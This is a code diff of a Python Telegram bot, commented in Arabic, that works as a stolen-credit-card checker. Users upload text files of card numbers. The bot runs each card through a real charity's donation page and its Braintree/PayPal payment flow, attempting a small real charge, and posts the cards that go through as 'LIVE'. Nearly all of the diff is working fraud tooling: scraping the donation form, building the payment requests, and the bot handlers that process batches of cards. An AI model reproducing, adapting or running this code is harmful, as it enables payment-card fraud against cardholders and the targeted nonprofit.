@@ -1,9 +1,17 @@
+import telebot
+import time
+import threading
+import cloudscraper
+from telebot import types
+import requests
+import random
 import os
-import asyncio
 import re
-from pyrogram import Client, filters
-from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
-from concurrent.futures import ThreadPoolExecutor
+import base64
+import string
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+from faker import Faker
+import urllib3
 
 # --- إعدادات البوت ---
 # جلب التوكن من متغيرات البيئة في ريندر
@@ -13,16 +21,15 @@ BOT_TOKEN = os.getenv("TG_BOT_VISA")
 if not BOT_TOKEN:
     raise ValueError("BOT_TOKEN not found! Please set TG_BOT_VISA environment variable in Render.")
 
+# إنشاء البوت
+bot = telebot.TeleBot(BOT_TOKEN)
+
 # --- قائمة لتخزين البطاقات النشطة ---
 live_cards = []
 
 # =================================================================
 # --- دالة الفحص التي أرسلتها (بدون أي تعديل) ---
 # =================================================================
-import requests, re, base64, random, string, user_agent, time, cloudscraper, urllib3
-from requests_toolbelt.multipart.encoder import MultipartEncoder
-from faker import Faker
-
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def pp(ccx, amount="1.10"):
@@ -56,7 +63,7 @@ def pp(ccx, amount="1.10"):
     country = "United States"
     
     scraper = cloudscraper.create_scraper()
-    user = user_agent.generate_user_agent()
+    user = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
     r = requests.session()
     r.verify = False
 
@@ -66,15 +73,7 @@ def pp(ccx, amount="1.10"):
         'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
         'cache-control': 'no-cache',
         'pragma': 'no-cache',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'cross-site',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
 
     response = r.get('https://combatantcraftcrewman.org/make-a-donation/', headers=headers)
@@ -95,13 +94,7 @@ def pp(ccx, amount="1.10"):
         'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
         'origin': 'https://combatantcraftcrewman.org',
         'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
-        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
         'x-requested-with': 'XMLHttpRequest',
     }
     
@@ -174,13 +167,7 @@ def pp(ccx, amount="1.10"):
         'content-type': multipart_data.content_type,
         'origin': 'https://combatantcraftcrewman.org',
         'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
-        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     params = {
@@ -204,13 +191,7 @@ def pp(ccx, amount="1.10"):
         'origin': 'https://assets.braintreegateway.com',
         'paypal-client-metadata-id': '2e65cd82c5f19469dfc0dd0cbd4cffa3',
         'referer': 'https://assets.braintreegateway.com/',
-        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     json_data = {
@@ -272,13 +253,7 @@ def pp(ccx, amount="1.10"):
         'content-type': multipart_data2.content_type,
         'origin': 'https://combatantcraftcrewman.org',
         'referer': 'https://combatantcraftcrewman.org/make-a-donation/',
-        'sec-ch-ua': '"Chromium";v="137", "Not;A=Brand";v="24"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     params = {
@@ -358,12 +333,6 @@ def pp(ccx, amount="1.10"):
         except:
             return "UNKNOWN_ERROR"
 
-# =================================================================
-# --- بايليجرام بوت (التعديل هنا) ---
-# =================================================================
-# الكود الجديد الصحيح
-app = Client(bot_token=BOT_TOKEN)
-
 # دالة مساعدة لتنسيق البطاقة
 def format_card(cc_str):
     try:
@@ -378,25 +347,84 @@ def format_card(cc_str):
         return None
 
 # =================================================================
+# --- دالة الفحص التي ستعمل في Thread منفصل ---
+# =================================================================
+def process_cards_in_thread(chat_id, message_id, file_path):
+    global live_cards
+    live_count = 0
+    dead_count = 0
+    
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            cards = [format_card(line.strip()) for line in f.readlines()]
+        
+        cards = [c for c in cards if c]
+        total_cards = len(cards)
+        if total_cards == 0:
+            bot.edit_message_text("❌ لم يتم العثور على بطاقات صالحة في الملف.", chat_id, message_id)
+            os.remove(file_path)
+            return
+
+        bot.edit_message_text(f"⚡️ بدأ فحص {total_cards} بطاقة...", chat_id, message_id)
+
+        for card in cards:
+            try:
+                result = pp(card)
+                
+                if "Thank You For Your Donation" in str(result):
+                    live_count += 1
+                    live_cards.append(card)
+                    # إرسال البطاقة الحية مباشرة للشات
+                    bot.send_message(
+                        chat_id,
+                        f"🔥 **بطاقة حية (LIVE)** 🔥\n\n`{card}`\n\n**الرد:** `{result}`",
+                        parse_mode='Markdown'
+                    )
+                else:
+                    dead_count += 1
+                
+                # تحديث الرسالة بشكل دوري (اختياري، يمكن إزالته لزيادة السرعة)
+                # bot.edit_message_text(f"⚡️ تم فحص {live_count + dead_count} / {total_cards} بطاقة...", chat_id, message_id)
+
+            except Exception as e:
+                print(f"Error checking card {card}: {e}")
+                dead_count += 1
+
+        # تحديث الرسالة النهائية
+        final_text = f"✅ **اكتمل الفحص!**\n\n"
+        final_text += f"🔥 **البطاقات الحية (LIVE):** `{live_count}`\n"
+        final_text += f"💀 **البطاقات الميتة (DEAD):** `{dead_count}`\n"
+        final_text += f"📊 **الإجمالي:** `{total_cards}`"
+        
+        bot.edit_message_text(final_text, chat_id, message_id, parse_mode='Markdown')
+
+    except Exception as e:
+        bot.edit_message_text(f"حدث خطأ غير متوقع: {e}", chat_id, message_id)
+    finally:
+        if os.path.exists(file_path):
+            os.remove(file_path)
+
+# =================================================================
 # --- الأمر الرئيسي لبدء الفحص ---
 # =================================================================
-@app.on_message(filters.command(["chr", "CHR"]) & filters.reply)
-async def handle_charge_command(client: Client, message: Message):
+@bot.message_handler(commands=['chr', 'CHR'])
+def handle_charge_command(message):
     global live_cards
     live_cards = [] # إفراغ القائمة في كل مرة جديدة
 
     # التحقق من أن الرد على ملف
     if not message.reply_to_message or not message.reply_to_message.document:
-        await message.reply("⚠️ يرجى الرد على ملف .txt يحتوي على البطاقات.")
+        bot.reply_to(message, "⚠️ يرجى الرد على ملف .txt يحتوي على البطاقات.")
         return
 
     # إنشاء أزرار الاختيار
-    choice_keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ تأكيد بدء الفحص", callback_data="start_charge_check")],
-        [InlineKeyboardButton("❌ إلغاء", callback_data="cancel_check")]
-    ])
+    choice_keyboard = types.InlineKeyboardMarkup()
+    confirm_button = types.InlineKeyboardButton(text="✅ تأكيد بدء الفحص", callback_data="start_charge_check")
+    cancel_button = types.InlineKeyboardButton(text="❌ إلغاء", callback_data="cancel_check")
+    choice_keyboard.add(confirm_button, cancel_button)
 
-    await message.reply(
+    bot.reply_to(
+        message,
         "هل تريد بدء فحص التشارج (PayPal Charge)؟\nهذه العملية حقيقية وستحاول شحن مبلغ صغير للتحقق من البطاقة.",
         reply_markup=choice_keyboard
     )
@@ -404,90 +432,50 @@ async def handle_charge_command(client: Client, message: Message):
 # =================================================================
 # --- معالج الأزرار التفاعلية ---
 # =================================================================
-@app.on_callback_query(filters.regex(r"start_charge_check"))
-async def start_checking(client: Client, callback_query):
-    global live_cards
-    processing_msg = await callback_query.message.edit("⚡️ جاري تحميل الملف وبدء الفحص السريع...")
-
+@bot.callback_query_handler(func=lambda call: call.data == "start_charge_check")
+def start_checking(call):
     try:
-        # تنزيل وقراءة الملف
-        file_path = await callback_query.message.reply_to_message.download()
-        with open(file_path, 'r', encoding='utf-8') as f:
-            cards = [format_card(line.strip()) for line in f.readlines()]
+        # تنزيل الملف
+        file_info = bot.get_file(call.message.reply_to_message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
         
-        cards = [c for c in cards if c] # إزالة القيم الفارغة أو الخاطئة
-        total_cards = len(cards)
-        if total_cards == 0:
-            await processing_msg.edit("❌ لم يتم العثور على بطاقات صالحة في الملف.")
-            os.remove(file_path)
-            return
-
-        await processing_msg.edit(f"⚡️ بدأ فحص {total_cards} بطاقة... هذه العملية قد تستغرق بعض الوقت.")
-
-        # استخدام ThreadPoolExecutor لتشغيل الدالة المتزامنة بسرعة
-        loop = asyncio.get_running_loop()
-        with ThreadPoolExecutor(max_workers=20) as pool:
-            tasks = [loop.run_in_executor(pool, pp, card) for card in cards]
-            results = await asyncio.gather(*tasks, return_exceptions=True)
-
-        live_count = 0
-        dead_count = 0
+        # حفظ الملف مؤقتاً
+        file_path = f"cards_{call.message.chat.id}.txt"
+        with open(file_path, 'wb') as new_file:
+            new_file.write(downloaded_file)
         
-        for i, result in enumerate(results):
-            card = cards[i]
-            if isinstance(result, Exception):
-                print(f"Error checking card {card}: {result}")
-                dead_count += 1
-                continue
-            
-            # تحديد ما إذا كانت البطاقة "حية"
-            if "Thank You For Your Donation" in str(result):
-                live_count += 1
-                live_cards.append(card)
-                # إرسال البطاقة الحية مباشرة للشات
-                await client.send_message(
-                    callback_query.chat.id,
-                    f"🔥 **بطاقة حية (LIVE)** 🔥\n\n`{card}`\n\n**الرد:** `{result}`"
-                )
-            else:
-                dead_count += 1
+        # تعديل رسالة التأكيد
+        processing_msg = bot.edit_message_text("⚡️ جاري تحميل الملف وبدء الفحص السريع...", call.message.chat.id, call.message.message_id)
         
-        # تحديث الرسالة النهائية
-        final_text = f"✅ **اكتمل الفحص!**\n\n"
-        final_text += f"🔥 **البطاقات الحية (LIVE):** `{live_count}`\n"
-        final_text += f"💀 **البطاقات الميتة (DEAD):** `{dead_count}`\n"
-        final_text += f"📊 **الإجمالي:** `{total_cards}`"
-        
-        await processing_msg.edit(final_text)
+        # تشغيل الفحص في Thread منفصل لعدم إيقاف البوت
+        thread = threading.Thread(target=process_cards_in_thread, args=(call.message.chat.id, processing_msg.message_id, file_path))
+        thread.start()
 
     except Exception as e:
-        await processing_msg.edit(f"حدث خطأ غير متوقع: {e}")
-    finally:
-        if os.path.exists(file_path):
-            os.remove(file_path)
+        bot.edit_message_text(f"حدث خطأ أثناء تحميل الملف: {e}", call.message.chat.id, call.message.message_id)
 
-@app.on_callback_query(filters.regex(r"cancel_check"))
-async def cancel_checking(client: Client, callback_query):
-    await callback_query.message.edit("❌ تم إلغاء عملية الفحص.")
+@bot.callback_query_handler(func=lambda call: call.data == "cancel_check")
+def cancel_checking(call):
+    bot.edit_message_text("❌ تم إلغاء عملية الفحص.", call.message.chat.id, call.message.message_id)
 
 # =================================================================
 # --- الأمر لعرض البطاقات الحية ---
 # =================================================================
-@app.on_message(filters.command(["live", "LIVE"]))
-async def show_live_cards(client: Client, message: Message):
+@bot.message_handler(commands=['live', 'LIVE'])
+def show_live_cards(message):
     global live_cards
     if not live_cards:
-        await message.reply("📭 لا توجد بطاقات حية حالياً في الخانة.")
+        bot.reply_to(message, "📭 لا توجد بطاقات حية حالياً في الخانة.")
         return
 
     live_text = "🔥 **البطاقات الحية (LIVE):**\n\n"
     for card in live_cards:
         live_text += f"`{card}`\n"
     
-    await message.reply(live_text)
+    bot.reply_to(message, live_text, parse_mode='Markdown')
 
 # =================================================================
 # --- تشغيل البوت ---
 # =================================================================
-print("- Bot is running on Render...")
-app.run()
+print("- Bot is running with telebot on Render...")
+bot.polling(none_stop=True)
